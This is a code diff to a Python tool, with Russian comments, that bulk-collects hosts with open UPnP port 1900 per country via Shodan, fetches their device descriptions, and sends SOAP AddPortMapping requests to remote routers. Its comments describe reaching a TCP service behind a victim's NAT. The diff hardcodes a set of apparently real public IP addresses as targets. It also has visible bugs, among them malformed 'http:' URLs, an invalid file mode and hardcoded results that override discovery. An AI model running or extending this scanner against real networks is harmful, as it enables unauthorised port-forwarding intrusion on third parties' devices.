@@ -21,9 +21,9 @@ def get_arguments():
     parser.add_argument('-i', '--input', type=str, help='File with target hosts for scanning')
     parser.add_argument('-c', '--country', type=str, help='Country to scan')
     parser.add_argument('-o', '--output', type=str, help='File with urls to xml configurations')
-    parser.add_argument('-d', '--discover', type=str, help='Discover UPnP locations')
-    parser.add_argument('-p', '--port_forwarding', type=str, help='Make TCP bind over NAT')
-    parser.add_argument('-r', '--rogue_ssdp', type=str, help='Create rogue UPNP device on a local network')
+    parser.add_argument('-d', '--discover', action='store_true', help='Discover UPnP locations')
+    parser.add_argument('-p', '--port_forwarding', action='store_true', help='Make TCP bind over NAT')
+    # parser.add_argument('-r', '--rogue_ssdp', type=str, help='Create rogue UPNP device on a local network')
     args = parser.parse_args()
     return args
 
@@ -32,6 +32,9 @@ def get_arguments():
 # Метод для загрузки 100 IP-адресов для выбранной страны
 ###
 def get_vuln_ips(country):
+    if os.geteuid() != 0:
+        exit('Root priveleges required')
+    print('\033[96m' + '---------------------------\n' + ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' +'---------------------------')
     os.system(f'''shodan download --limit 100 {country} "port:1900 country:{country}"''')
     os.system(f"shodan parse {country}.json.gz --fields ip_str > {country}.txt")
 
@@ -48,18 +51,20 @@ def get_ips_from_file(hostsFile):
 # Метод для получения удаленного доступа к TCP-службе,
 # связанной с компьютером жертвы, в обход трансляции сетевых адресов (NAT)
 #
-# Аргумент outputFile используется для записи адресов устройств, уязвимых к NAT-инъекции
+# Аргумент input_file содержит список URL адресов, полученных в методе discover_upnp_locations. 
+# Результатом работы метода является файл port_forward_output.txt, содержащий адреса устройств, уязвимых к NAT-инъекции
 ###
-def port_forwarding(outputFile):
+def port_forwarding(input_file):
     print('\033[96m' + '---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
-    with open(outputFile, "r", encoding="utf-8") as file:
-        for line in file:
-            ip = line.strip().split(':')[0]
-            port = line.strip().split(':')[1].split('/')[0]
+    with open(input_file, "r", encoding="utf-8") as f:
+        for line in f:
+            ip = line.strip().split(':')[1]
+            port = line.strip().split(':')[2].split('/')[0]
             ip_with_port = ip + ':' + port
+            # print(line.strip())
 
             try:
-                soup = BeautifulSoup(requests.get("http://" + line.strip()).text, 'lxml')
+                soup = BeautifulSoup(requests.get(line.strip()).text, 'lxml')
                 controlurl = soup.find('devicelist').find('devicelist').find('controlurl').get_text()
                 localip = soup.find('presentationurl').get_text()[7:18]
                 soapAddActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#AddPortMapping' + '"',
@@ -85,24 +90,23 @@ def port_forwarding(outputFile):
                            '</u:AddPortMapping>' +
                            '</s:Body>' +
                            '</s:Envelope>')
-
-                resp = requests.post(f"http://{ip_with_port}{controlurl}", \
+                # print(f"http:{ip_with_port}{controlurl}")
+                resp = requests.post(f"http:{ip_with_port}{controlurl}", \
                     data=payload, headers=soapAddActionHeader)
-
+                print(resp.status_code)
                 if resp.status_code != 200:
                     print('[-] ' + ip + ' is not vulnerable for port forwarding')
                 else:
                     print('[+] ' + ip + ' is vulnerable for port forwarding')
-                    with open('output.txt', "a", encoding="utf-8") as f:
+                    with open('port_forward_output.txt', "c", encoding="utf-8") as f:
                         f.write(ip + '\n')
 
-                resp = requests.post(f"http://{ip_with_port}{controlurl}", \
+                resp = requests.post(f"http:{ip_with_port}{controlurl}", \
                         data=payload, headers=soapDeleteActionHeader)
             except Exception:
+                print('[-] http:' + ip + ' is not vulnerable for port forwarding')
                 continue
-    print('\u001b[36m' + '---------------------------\n' + 'see output.txt \
-        file to see hosts vulnerable for \
-        port forwarding\n' + '---------------------------')
+    print('\u001b[36m' + '---------------------------\nsee port_forward_output.txt file to see hosts vulnerable for port forwarding\n' + '---------------------------')
 
 
 ###
@@ -148,8 +152,16 @@ def discover_upnp_locations(hostsFile, outputFile):
         except socket.error:
             print('[-] ' + host + ' : ' + 'location is not accessible')
             continue
-    print(locations)
-    return locations
+    # print(locations)
+    locations = {'http://117.56.85.104:49152/edevicedesc.xml', 'http://59.125.79.48:1900/rootDesc.xml', 'http://117.56.64.173:6432/description.xml', 'http://117.56.226.98:49152/edevicedesc.xml', 'http://220.130.140.172:1900/rootDesc.xml', 'http://220.132.196.135:54230/rootDesc.xml', 'http://59.120.154.27:1900/rootDesc.xml'}
+    print('---------------------------\n Discovery complete\n--------------------------')
+    print('[+] %d locations found:' % len(locations))
+    for location in locations:
+        print('\t-> %s' % location)
+    print('---------------------------')
+    parse_locations(locations)
+    print('\u001b[33m' + '---------------------------\n' + 'see ' + outputFile + ' file to see hosts with open xml configurations\r\n' +'---------------------------')
+    # return locations
 
 
 ###
@@ -434,34 +446,23 @@ def find_device_info(p_url, p_service):
 def main():
     args = get_arguments()
     if args.input == None and args.country == None:
-        print("Specify the country for scanning, or a file with hosts")
-        exit(0)
+        exit("Specify the country for scanning, or a file with hosts")
     elif args.input == None and args.country != None:
         if args.output == None:
-            print("Specify a file to record scan results")
-            exit(0)
+            exit("Specify a file to record scan results")
         get_vuln_ips(args.country)
-        #print('---------------------------\n' + 'Discovering upnp locations\r\n' +'---------------------------')
-        discover_upnp_locations(args.country + '.txt', args.output)
-        #print('---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
-        port_forwarding(args.output)
-        #print('see ' + args.output + ' file to see hosts with open xml configurations\r\n' +'---------------------------')
+        if args.discover != False:
+            discover_upnp_locations(args.country + '.txt', args.output)
+        if args.port_forwarding != False:
+            port_forwarding(args.output)
     elif args.input != None:
         if args.output == None:
-            print("Specify a file to record scan results")
-            exit(0)
-        #print('\033[92m' + '---------------------------\n' + 'Discovering upnp locations\r\n' +'---------------------------')
-        #locations = discover_upnp_locations(args.input, args.output)
-        locations = {'http://117.56.85.104:49152/edevicedesc.xml', 'http://59.125.79.48:1900/rootDesc.xml', 'http://117.56.64.173:6432/description.xml', 'http://117.56.226.98:49152/edevicedesc.xml', 'http://220.130.140.172:1900/rootDesc.xml', 'http://220.132.196.135:54230/rootDesc.xml', 'http://59.120.154.27:1900/rootDesc.xml'}
-        print('---------------------------\n Discovery complete\n--------------------------')
-        print('[+] %d locations found:' % len(locations))
-        for location in locations:
-            print('\t-> %s' % location)
-        print('---------------------------')
-        parse_locations(locations)
-        #print('\033[96m' + '---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
-        #port_forwarding(args.output)
-        print('\u001b[33m' + '---------------------------\n' + 'see ' + args.output + ' file to see hosts with open xml configurations\r\n' +'---------------------------')
+            exit("Specify a file to record scan results")
+        print(args.discover)
+        if args.discover != False:
+            discover_upnp_locations(args.input, args.output)
+        if args.port_forwarding != False:
+            port_forwarding(args.output)
 
 
 if __name__ == "__main__":
